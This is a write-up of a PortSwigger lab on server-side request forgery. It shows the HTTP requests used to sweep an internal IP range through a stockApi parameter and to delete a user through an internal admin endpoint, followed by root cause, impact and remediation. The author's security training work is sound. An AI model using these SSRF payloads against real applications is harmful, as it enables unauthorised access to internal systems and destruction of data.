# PortSwigger Lab: Basic SSRF against another back-end system

**TAGS:** SSRF, Server-Side Request Forgery, Burp Intruder

**Category:** SSRF  
**Date:** November 4, 2026  
**Day:** Wednesday  
**Link:** https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-other-backend-system  
**Published:** Ready  
**Status:** Done

---

## Intro

This is the second lab in the SSRF series. In the first one the admin panel was on localhost, so I just pointed the URL there. Here the admin panel runs on a separate machine inside the internal network, so first I had to discover its IP address.

This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.

---

## Reconnaissance:

#### Lab Description Lookup:

The lab description says the stock check feature talks to an internal system, and the admin interface lives on a different back-end system. The goal is to find that system and delete the user `carlos`.

I opened a product page and clicked "Check stock". The request was:

```http
POST /product/stock HTTP/2
Host: 0a4e00790427b67d825edd1300480061.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=2
```

The `stockApi` parameter points at an internal IP in the `192.168.0.0/24` range. The stock server is at `192.168.0.1`, and the admin panel is on another machine in that same range.

---

## Exploitation:

#### Step 1: Enumerate the internal network with Intruder

I sent the stock request to Burp Intruder and marked the last octet as the payload position:

```http
POST /product/stock HTTP/2
Host: 0a4e00790427b67d825edd1300480061.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://192.168.0.§X§:8080/admin
```

I used a simple payload of numbers from `1` to `255`, one request per IP. Most of the responses were errors, but one came back with a `200` status and showed the admin panel:

```text
192.168.0.184
```

That is the back-end system hosting `/admin`.

#### Step 2: Delete carlos

I copied that request into Repeater and changed the URL to the delete endpoint:

```http
POST /product/stock HTTP/2
Host: 0a4e00790427b67d825edd1300480061.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://192.168.0.184:8080/admin/delete?username=carlos
```

The server fetched the URL from inside the network, allowing the request to reach an admin endpoint that trusts internal connections. The user `carlos` was deleted and the lab was solved.

---

## Root Cause

The `stockApi` parameter is a URL that the server fetches without checking the destination. The admin interface trusts requests that come from inside the network, so the SSRF lets me reach the admin panel on `192.168.0.184` and even perform actions there.

---

## Impact

An attacker can map the internal network and reach services that are not exposed to the internet. In this lab that meant finding the admin panel and deleting a user. In a real application the same technique can find databases, monitoring tools, cloud metadata and other internal systems, then potentially read or modify data on them.

---

## Remediation

To prevent this issue, applications should:

- Validate and allow-list the URLs the server is allowed to fetch.
- Block requests to private and loopback ranges, and to cloud metadata endpoints.
- Authenticate and authorize every internal endpoint, not just the internet-facing ones.
- Use a fixed server-side configuration for internal endpoints instead of accepting a URL from the client.

---

## Key Takeaways

1. Internal services may trust requests that come from inside the network.
2. Intruder makes it easy to sweep an internal range and identify machines that respond.
3. A `200` among many errors can be a useful signal, but the response content is needed to confirm that the target was found.
4. The same SSRF that reads an internal page can also perform actions on it.

---

## References

- PortSwigger — Server-side request forgery (SSRF): https://portswigger.net/web-security/ssrf
- PortSwigger — Basic SSRF against another back-end system (lab): https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-other-backend-system
- OWASP — Server-Side Request Forgery: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.